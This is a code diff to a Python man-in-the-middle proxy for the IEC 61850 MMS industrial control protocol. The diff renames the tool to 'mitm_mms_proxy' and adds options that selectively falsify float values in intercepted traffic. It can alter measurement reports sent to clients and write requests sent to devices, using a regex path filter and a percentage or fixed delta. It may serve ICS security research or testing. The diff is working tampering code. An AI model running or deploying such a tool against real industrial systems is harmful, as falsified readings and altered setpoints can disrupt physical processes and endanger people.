@@ -4,13 +4,14 @@ Direct MMS Proxy (no SSLproxy, no iptables required).
 Listens on one port, forwards to another port unmodified.
 Useful for testing and development.
 
-Usage: python3 mms_direct_proxy.py --listen-port 102 --server-host 127.0.0.1 --server-port 103 [--parse]
+Usage: python3 mitm_mms_proxy.py --listen-port 102 --server-host 127.0.0.1 --server-port 103 [--parse]
 """
 
 import socket
 import sys
 import argparse
 import logging
+import re
 from threading import Thread
 
 from iec61850_mms.mms.rt.report_decoder import decode_unconfirmed_report
@@ -29,7 +30,7 @@ except ImportError:
 
 # Setup logging - write to local file in current directory
 log_handlers = [logging.StreamHandler()]
-log_handlers.append(logging.FileHandler('mms_direct_proxy.log'))
+log_handlers.append(logging.FileHandler('mitm_mms_proxy.log'))
 
 logging.basicConfig(
     level=logging.INFO,
@@ -53,33 +54,57 @@ class MmsDirectProxy:
         server_host,
         server_port,
         parse_mms=False,
-        modify_floats=False,
-        float_delta=21.0,
+        modify_report_floats=False,
+        report_float_delta=21.0,
+        report_float_percentage=None,
+        report_float_path_regex=None,
         modify_write_floats=False,
         write_float_delta=0.0,
+        write_float_percentage=None,
+        write_float_path_regex=None,
     ):
         self.listen_port = listen_port
         self.server_host = server_host
         self.server_port = server_port
         self.parse_mms = parse_mms
-        self.modify_floats = modify_floats
-        self.float_delta = float_delta
+        self.modify_report_floats = modify_report_floats
+        self.report_float_delta = report_float_delta
+        self.report_float_percentage = report_float_percentage
+        self.report_float_path_regex = report_float_path_regex
         self.modify_write_floats = modify_write_floats
         self.write_float_delta = write_float_delta
+        self.write_float_percentage = write_float_percentage
+        self.write_float_path_regex = write_float_path_regex
         self.conn_id = 0
 
     def rewrite_unconfirmed_floats(self, payload, direction):
-        if not self.modify_floats:
+        if not self.modify_report_floats:
             return payload
         if "server→client" not in direction:
             return payload
 
         try:
-            modified_payload, changed_count = mutate_unconfirmed_report_floats(payload, self.float_delta)
+            modified_payload, changed_count = mutate_unconfirmed_report_floats(
+                payload,
+                self.report_float_delta,
+                self.report_float_path_regex,
+                self.report_float_percentage,
+            )
             if changed_count:
-                logger.info(
-                    f"[{direction}] Rewrote {changed_count} float value(s) with +{self.float_delta:g}"
+                op = (
+                    f"{self.report_float_percentage:g}%"
+                    if self.report_float_percentage is not None
+                    else f"+{self.report_float_delta:g}"
                 )
+                if self.report_float_path_regex:
+                    logger.info(
+                        f"[{direction}] Rewrote {changed_count} float value(s) with {op} "
+                        f"for paths matching /{self.report_float_path_regex}/"
+                    )
+                else:
+                    logger.info(
+                        f"[{direction}] Rewrote {changed_count} float value(s) with {op}"
+                    )
             return modified_payload
         except Exception as exc:
             logger.debug(f"[{direction}] Float rewrite failed: {exc}")
@@ -92,11 +117,28 @@ class MmsDirectProxy:
             return payload
 
         try:
-            modified_payload, changed_count = mutate_write_request_floats(payload, self.write_float_delta)
+            modified_payload, changed_count = mutate_write_request_floats(
+                payload,
+                self.write_float_delta,
+                self.write_float_path_regex,
+                self.write_float_percentage,
+            )
             if changed_count:
-                logger.info(
-                    f"[{direction}] Rewrote {changed_count} write-request float value(s) with +{self.write_float_delta:g}"
+                op = (
+                    f"{self.write_float_percentage:g}%"
+                    if self.write_float_percentage is not None
+                    else f"+{self.write_float_delta:g}"
                 )
+                if self.write_float_path_regex:
+                    logger.info(
+                        f"[{direction}] Rewrote {changed_count} write-request float value(s) "
+                        f"with {op} for paths matching /{self.write_float_path_regex}/"
+                    )
+                else:
+                    logger.info(
+                        f"[{direction}] Rewrote {changed_count} write-request float value(s) "
+                        f"with {op}"
+                    )
             return modified_payload
         except Exception as exc:
             logger.debug(f"[{direction}] Write-request float rewrite failed: {exc}")
@@ -333,9 +375,9 @@ class MmsDirectProxy:
             server_socket.close()
 
 
-if __name__ == '__main__':
+def main(argv=None):
     parser = argparse.ArgumentParser(
-        description='Direct MMS Proxy - forwards traffic without SSLproxy or iptables'
+        description='MITM MMS Proxy - forwards traffic without SSLproxy or iptables'
     )
     parser.add_argument(
         '--listen-port', type=int, default=102,
@@ -354,23 +396,51 @@ if __name__ == '__main__':
         help='Enable MMS parsing for logging (report decoder + optional Scapy fallback)'
     )
     parser.add_argument(
-        '--modify-floats', action='store_true',
+        '--modify-report-floats', action='store_true',
         help='Add +21 to float values inside UnconfirmedPDU reports (server→client only)'
     )
     parser.add_argument(
-        '--float-delta', type=float, default=21.0,
-        help='Delta added to float values when --modify-floats is enabled (default: 21.0)'
+        '--report-float-delta', type=float, default=21.0,
+        help='Delta added to float values when --modify-report-floats is enabled (default: 21.0)'
+    )
+    parser.add_argument(
+        '--report-float-percentage', type=float, default=None,
+        help='Percentage applied to report float values relative to base value (e.g. 10 means +10%%)'
+    )
+    parser.add_argument(
+        '--report-float-path-regex', default=None,
+        help='Only modify periodic-report float values whose data attribute path matches this regex'
     )
     parser.add_argument(
         '--modify-write-floats', action='store_true',
         help='Modify float values inside WriteRequest listOfData (client→server only)'
     )
     parser.add_argument(
-        '--write-float-delta', type=float, default=5.0,
+        '--write-float-delta', type=float, default=0.0,
         help='Delta added to WriteRequest float values when --modify-write-floats is enabled (default: 0.0)'
     )
+    parser.add_argument(
+        '--write-float-percentage', type=float, default=None,
+        help='Percentage applied to write-request float values relative to base value (e.g. -5 means -5%%)'
+    )
+    parser.add_argument(
+        '--write-float-path-regex', default=None,
+        help='Only modify write-request float values whose data attribute path matches this regex'
+    )
     
-    args = parser.parse_args()
+    args = parser.parse_args(argv)
+
+    if args.report_float_path_regex is not None:
+        try:
+            re.compile(args.report_float_path_regex)
+        except re.error as exc:
+            parser.error(f"Invalid --report-float-path-regex: {exc}")
+
+    if args.write_float_path_regex is not None:
+        try:
+            re.compile(args.write_float_path_regex)
+        except re.error as exc:
+            parser.error(f"Invalid --write-float-path-regex: {exc}")
     
     if not SCAPY_AVAILABLE and args.parse:
         logger.info("Scapy not available; using BER report decoder only")
@@ -380,9 +450,19 @@ if __name__ == '__main__':
         server_host=args.server_host,
         server_port=args.server_port,
         parse_mms=args.parse,
-        modify_floats=args.modify_floats,
-        float_delta=args.float_delta,
+        modify_report_floats=args.modify_report_floats,
+        report_float_delta=args.report_float_delta,
+        report_float_percentage=args.report_float_percentage,
+        report_float_path_regex=args.report_float_path_regex,
         modify_write_floats=args.modify_write_floats,
         write_float_delta=args.write_float_delta,
+        write_float_percentage=args.write_float_percentage,
+        write_float_path_regex=args.write_float_path_regex,
     )
     proxy.start()
+
+    return 0
+
+
+if __name__ == '__main__':
+    raise SystemExit(main())
